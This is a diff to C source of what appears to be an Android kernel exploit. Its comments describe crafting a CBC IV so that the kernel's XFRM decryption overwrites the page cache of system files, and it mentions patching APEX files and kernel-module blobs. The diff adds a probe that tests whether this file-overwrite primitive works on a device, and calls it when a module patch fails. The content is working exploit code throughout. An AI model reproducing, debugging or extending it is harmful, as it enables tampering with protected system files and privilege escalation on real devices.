@@ -43,6 +43,10 @@ static uint8_t  g_hmac_key[32];
 static int      g_icv_len;    /* auth truncation in bytes (128-bit → 16) */
 static uint32_t g_seq = 1;   /* monotonically increasing per-write */
 
+/* Writable dir for xfrm_probe, set by the caller. Untrusted apps cannot write
+ * /data/local/tmp, so there is no usable default. */
+const char *g_data_dir;
+
 /* IV = AES256_ECB_DEC(key, old_content) XOR desired
  * When kernel CBC-decrypts: plaintext = AES_DEC(key, ciphertext) XOR IV
  *   = AES_DEC(key, old_content) XOR IV
@@ -271,7 +275,51 @@ static int patch_file_cbc(const char *path, const char *payload, size_t len,
     return rc;
 }
 
-/* ---- KO and splicehelper blobs (identical layout to DFReroot) ---- */
+/* Distinguish "the XFRM write never landed" from "it landed in a copy, not the
+ * page cache". Writes into a private f2fs file, which rules out APEX/erofs and
+ * page-cache aliasing as the cause. */
+static void xfrm_probe(struct Reporter *reporter) {
+    if (!g_data_dir) return;
+    char path[256];
+    snprintf(path, sizeof(path), "%s/dfprobe", g_data_dir);
+
+    int fd = open(path, O_RDWR | O_CREAT | O_TRUNC, 0644);
+    if (fd < 0) {
+        REPORTLN("xfrm probe: open %s failed: %s", path, strerror(errno));
+        return;
+    }
+
+    char orig[32], want[32];
+    for (int i = 0; i < 32; i++) orig[i] = (char)i;
+    memcpy(want, orig, 32);
+    want[0] ^= 0xff;
+    want[1] ^= 0xff;
+    if (pwrite(fd, orig, 32, 0) != 32) {
+        REPORTLN("xfrm probe: pwrite failed: %s", strerror(errno));
+        close(fd);
+        unlink(path);
+        return;
+    }
+
+    int rc = patch_file_cbc(path, want, 16, 0, 0, reporter);
+
+    uint8_t got[16] = {0};
+    ssize_t n = pread(fd, got, 16, 0);
+    close(fd);
+    unlink(path);
+
+    if (rc != 0) {
+        REPORTLN("xfrm probe: write failed, the SA or the socket is the problem");
+        return;
+    }
+    if (n == 16 && memcmp(got, want, 16) == 0) {
+        REPORTLN("xfrm probe: OK, XFRM wrote through to the page cache. "
+                 "The APEX file or its filesystem is the problem");
+    } else {
+        REPORTLN("xfrm probe: unchanged, XFRM decrypted into a copy or the "
+                 "state never matched. This kernel is not vulnerable here");
+    }
+}
 
 extern char libcxx_start[];
 extern char libcxx_data[];
@@ -396,6 +444,7 @@ static int patch_ko(struct Reporter *reporter) {
             close(vfd);
             if (n == 16 && memcmp(verify, sh_buf + 16, 16) != 0) {
                 REPORTLN("patch #1 verify FAILED: page cache not modified");
+                xfrm_probe(reporter);
                 free(sh_buf);
                 return -1;
             }
